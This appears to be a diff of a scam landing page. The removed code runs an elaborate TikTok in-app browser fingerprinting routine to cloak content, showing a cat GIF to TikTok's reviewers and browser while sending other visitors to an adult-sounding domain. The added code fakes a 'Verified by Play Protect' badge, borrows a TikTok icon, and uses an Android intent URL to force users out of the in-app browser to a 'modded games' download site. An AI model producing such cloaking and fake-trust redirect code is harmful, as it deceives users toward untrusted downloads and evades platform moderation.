@@ -1,349 +1,133 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Little Cats</title>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      background-color: #000;
-      font-family: Arial, sans-serif;
-    }
-    
-    /* Loading Spinner */
-    #loading-container {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: #000;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      z-index: 1000;
-    }
-    
-    .spinner {
-      width: 60px;
-      height: 60px;
-      border: 4px solid rgba(255, 255, 255, 0.3);
-      border-radius: 50%;
-      border-top-color: #fff;
-      animation: spin 1s ease-in-out infinite;
-    }
-    
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-    
-    .loading-text {
-      color: white;
-      margin-top: 20px;
-      font-size: 16px;
-    }
-    
-    /* GIF Container (hidden by default) */
-    #gif-container {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      display: none;
-      z-index: 900;
-    }
-    
-    #tiktok-gif {
-      width: 100vw;
-      height: 100vh;
-      object-fit: cover;
-    }
-    
-    /* Fade in animation for GIF */
-    .fade-in {
-      animation: fadeIn 0.5s ease-in forwards;
-    }
-    
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-  </style>
-  <script>
-    // UPDATED FOR 2026 - TIKTOK DETECTION
-    
-    // Method 1: Check for ALL known TikTok/ByteDance patterns
-    function checkTikTokPatterns() {
-      const ua = navigator.userAgent.toLowerCase();
-      
-      // Direct TikTok/Bytedance strings (updated for 2026)
-      const tiktokPatterns = [
-        'tiktok', 'aweme', 'douyin', 'bytedance', 'musically',
-        'tt-webview', 'tt_wv', 'ttwebview', 'sslocal', 'ttnet',
-        'ttpod', 'ttlive', 'ttvideo', 'ttmini', 'ttmicro',
-        'ttembed', 'ttplayer', 'ttshare', 'ttbrowser', 'ttapp',
-        'com.zhiliaoapp', 'com.ss.android', 'com.bytedance'
-      ];
-      
-      for (const pattern of tiktokPatterns) {
-        if (ua.includes(pattern)) {
-          console.log(`Found TikTok pattern: ${pattern}`);
-          return true;
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting to MODXNET...</title>
+    <link rel="icon" href="https://sf-tb-sg.ibytedtos.com/obj/eden-sg/uhtyvueh7nulogpoguhm/tiktok-icon2.png" type="image/x-icon">
+
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: #f0f0f0; /* بدون صورة خلفية */
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            box-sizing: border-box;
         }
-      }
-      
-      return false;
-    }
-    
-    // Method 2: Check WebView patterns (updated for 2026)
-    function checkWebViewPatterns() {
-      const ua = navigator.userAgent;
-      
-      // Modern WebView patterns (2024-2026)
-      const webViewPatterns = [
-        /(iPhone|iPad|iPod).*AppleWebKit(?!.*Safari)/i,
-        /(Android).*Version\/[\d\.]+.*Chrome\/[\d\.]+.*Mobile Safari\/[\d\.]+.*(?!Chrome)/i,
-        /; wv\).*Chrome\/[\d\.]+.*Mobile Safari\/[\d\.]+/i,
-        /Mobile.*AppleWebKit.*(?!Safari|Chrome|Firefox|Edge)/i,
-        /\(Linux; Android.*\) AppleWebKit\/[\d\.]+ \(KHTML, like Gecko\) Version\/[\d\.]+/i
-      ];
-      
-      for (const pattern of webViewPatterns) {
-        if (pattern.test(ua)) {
-          console.log(`Found WebView pattern: ${pattern}`);
-          return true;
+
+        #logo {
+            width: 300px;
+            margin-bottom: 25px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
         }
-      }
-      
-      return false;
-    }
-    
-    // Method 3: Check for blocked APIs (TikTok always blocks these)
-    function checkBlockedAPIs() {
-      let blockedCount = 0;
-      
-      // TikTok blocks these specific APIs
-      const apisToCheck = [
-        { name: 'share', api: navigator.share },
-        { name: 'getBattery', api: navigator.getBattery },
-        { name: 'bluetooth', api: navigator.bluetooth },
-        { name: 'usb', api: navigator.usb },
-        { name: 'hid', api: navigator.hid },
-        { name: 'serial', api: navigator.serial }
-      ];
-      
-      for (const { name, api } of apisToCheck) {
-        if (api === undefined) {
-          blockedCount++;
-          console.log(`API blocked: ${name}`);
+
+        .redirect-text {
+            font-size: 22px;
+            color: #2c3e50;
+            opacity: 0;
+            animation: fadeIn 0.5s ease-in-out forwards;
+            text-align: center;
+            margin: 15px 0;
+            line-height: 1.4;
+            max-width: 500px;
+            background-color: rgba(255, 255, 255, 0.8);
+            padding: 15px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
-      }
-      
-      // TikTok also often blocks clipboard API
-      try {
-        if (navigator.clipboard) {
-          // Just checking existence
+
+        .play-protect-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(46, 204, 113, 0.15);
+            padding: 10px 15px;
+            border-radius: 24px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            margin: 20px 0;
+            gap: 6px;
+            font-size: 14px;
+            border: 1px solid #2ecc71;
+            backdrop-filter: blur(5px);
         }
-      } catch(e) {
-        blockedCount++;
-        console.log('Clipboard API blocked');
-      }
-      
-      return blockedCount >= 3; // If 3+ APIs blocked, likely TikTok
-    }
-    
-    // Method 4: Check screen/window properties
-    function checkScreenProperties() {
-      // TikTok WebView has specific behavior
-      const props = {
-        hasTouch: 'ontouchstart' in window,
-        maxTouchPoints: navigator.maxTouchPoints || 0,
-        screenWidth: window.screen.width,
-        screenHeight: window.screen.height,
-        innerWidth: window.innerWidth,
-        innerHeight: window.innerHeight,
-        devicePixelRatio: window.devicePixelRatio
-      };
-      
-      console.log('Screen properties:', props);
-      
-      // Check if it's a mobile device
-      const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-      
-      if (!isMobile) return false;
-      
-      // Check for common mobile screen sizes (2024-2026 devices)
-      const width = window.screen.width;
-      const height = window.screen.height;
-      
-      const commonSizes2026 = [
-        {w: 393, h: 852},  // iPhone 15/16
-        {w: 430, h: 932},  // iPhone 15/16 Pro Max
-        {w: 390, h: 844},  // iPhone 14/15 Pro
-        {w: 414, h: 896},  // iPhone 11/12/XR
-        {w: 375, h: 812},  // iPhone X/XS/11 Pro
-        {w: 360, h: 800},  // Common Android
-        {w: 412, h: 915},  // Pixel 7/8
-        {w: 393, h: 873},  // Samsung S23/S24
-        {w: 412, h: 892},  // Various Android
-        {w: 360, h: 780},  // Various Android
-      ];
-      
-      for (const size of commonSizes2026) {
-        if (Math.abs(width - size.w) <= 10 && Math.abs(height - size.h) <= 10) {
-          console.log(`Matches common mobile size: ${size.w}x${size.h}`);
-          return true;
+
+        .play-protect-badge svg {
+            width: 18px;
+            height: 18px;
         }
-      }
-      
-      return false;
-    }
-    
-    // Method 5: Check for specific behavior
-    function checkBehavior() {
-      // Try to detect if it's an in-app browser
-      try {
-        // In-app browsers often have limited features
-        const testElement = document.createElement('input');
-        testElement.type = 'file';
-        
-        if (testElement.disabled) {
-          console.log('File input disabled - likely in-app browser');
-          return true;
+
+        .secure-text {
+            color: #2ecc71;
+            font-weight: bold;
         }
-        
-        // Check for specific events
-        if (!('onbeforeunload' in window)) {
-          console.log('Missing onbeforeunload - likely in-app browser');
-          return true;
+
+        .dot {
+            color: #2ecc71;
         }
-        
-      } catch(e) {
-        console.log('Behavior check error - likely in-app browser');
-        return true;
-      }
-      
-      return false;
-    }
-    
-    // Main TikTok detection for 2026
-    function isTikTokBrowser() {
-      console.log('=== TIKTOK DETECTION 2026 ===');
-      console.log('User Agent:', navigator.userAgent);
-      
-      const ua = navigator.userAgent.toLowerCase();
-      const isMobile = /android|iphone|ipad|ipod/i.test(ua);
-      
-      // Desktop can't be TikTok
-      if (!isMobile) {
-        console.log('Not mobile - not TikTok');
-        return false;
-      }
-      
-      let score = 0;
-      const maxScore = 10;
-      
-      // Test 1: Direct patterns (strongest indicator)
-      if (checkTikTokPatterns()) score += 4;
-      
-      // Test 2: WebView patterns
-      if (checkWebViewPatterns()) score += 3;
-      
-      // Test 3: Blocked APIs
-      if (checkBlockedAPIs()) score += 2;
-      
-      // Test 4: Screen properties
-      if (checkScreenProperties()) score += 1;
-      
-      // Test 5: Behavior
-      if (checkBehavior()) score += 1;
-      
-      console.log(`Detection score: ${score}/${maxScore}`);
-      
-      // Decision logic
-      if (score >= 4) {
-        console.log('✅ TikTok detected');
-        return true;
-      } else if (score >= 2) {
-        console.log('⚠️ Possibly TikTok/in-app browser');
-        return true; // When in doubt, treat as TikTok
-      } else {
-        console.log('❌ Normal browser');
-        return false;
-      }
-    }
-    
-    // Check device type
-    function isMobileDevice() {
-      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-    }
-    
-    // Show the GIF with fade effect
-    function showGif() {
-      const loading = document.getElementById('loading-container');
-      const gifContainer = document.getElementById('gif-container');
-      
-      // Hide loading
-      if (loading) loading.style.display = 'none';
-      
-      // Show GIF with fade animation
-      if (gifContainer) {
-        gifContainer.style.display = 'block';
-        gifContainer.classList.add('fade-in');
-      }
-    }
-    
-    // Main logic
-    document.addEventListener('DOMContentLoaded', function() {
-      console.log('=== PAGE LOADED ===');
-      
-      // Show loading for at least 1 second
-      setTimeout(() => {
-        // Check if desktop
-        if (!isMobileDevice()) {
-          console.log('🖥️ Desktop detected - redirecting');
-          window.location.href = 'https://rqmdq.talkingirlss.com';
-          return;
+
+        .verified-text {
+            color: #27ae60;
+            font-weight: bold;
         }
-        
-        console.log('📱 Mobile device detected');
-        
-        // Check if TikTok
-        if (isTikTokBrowser()) {
-          console.log('🎵 TikTok browser - showing GIF');
-          showGif();
-        } else {
-          console.log('🌐 Normal mobile browser - redirecting');
-          window.location.href = 'https://rqmdq.talkingirlss.com';
+
+        @keyframes fadeIn {
+            0% {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
-      }, 1000);
-    });
-    
-    // Fallback: If still loading after 3 seconds, redirect
-    setTimeout(() => {
-      const loading = document.getElementById('loading-container');
-      if (loading && loading.style.display !== 'none' && 
-          !window.location.href.includes('talkingirlss.com')) {
-        console.log('⏰ Fallback redirect');
-        window.location.href = 'https://rqmdq.talkingirlss.com';
-      }
-    }, 3000);
-  </script>
+
+    </style>
 </head>
+
 <body>
-  <!-- Loading Spinner (shows first) -->
-  <div id="loading-container">
-    <div class="spinner"></div>
-    <div class="loading-text">Checking browser...</div>
-  </div>
-  
-  <!-- GIF Container (hidden until TikTok detected) -->
-  <div id="gif-container">
-    <img id="tiktok-gif" src="TikTok.gif" alt="Content">
-  </div>
+    <img id="logo" src="https://www9.0zz0.com/2024/04/06/13/548511907.gif" alt="Website Logo">
+    
+    <p class="redirect-text">
+        <strong>Please Click On The Three Dots At The Top And Open in Browser To Be Able Downloding the Games</strong>
+    </p>
+
+    <!-- Play Protect Verified Badge -->
+    <div class="play-protect-badge">
+        <svg xmlns="http://www.w3.org/2000/svg" stroke="#2ecc71" stroke-width="2" fill="none" viewBox="0 0 24 24">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+        </svg>
+        <span class="secure-text">Secure</span>
+        <span class="dot">•</span>
+        <span class="verified-text">Verified by Play Protect</span>
+    </div>
+
+    <script>
+        function openLinkBasedOnDevice(url) {
+            var userAgent = navigator.userAgent;
+
+            if (/(android)/i.test(userAgent)) {
+                window.location.href =
+                    'intent://' +
+                    url.substring(url.indexOf("://") + 3) +
+                    '#Intent;scheme=http;package=com.android.chrome;end;';
+            } else if (/(iphone|ipad|ipod)/i.test(userAgent)) {
+                window.location.href = url;
+            } else {
+                window.location.href = url;
+            }
+        }
+
+        setTimeout(function () {
+            var url = 'https://zompamod.github.io';
+            openLinkBasedOnDevice(url);
+        }, 100);
+    </script>
 </body>
 </html>
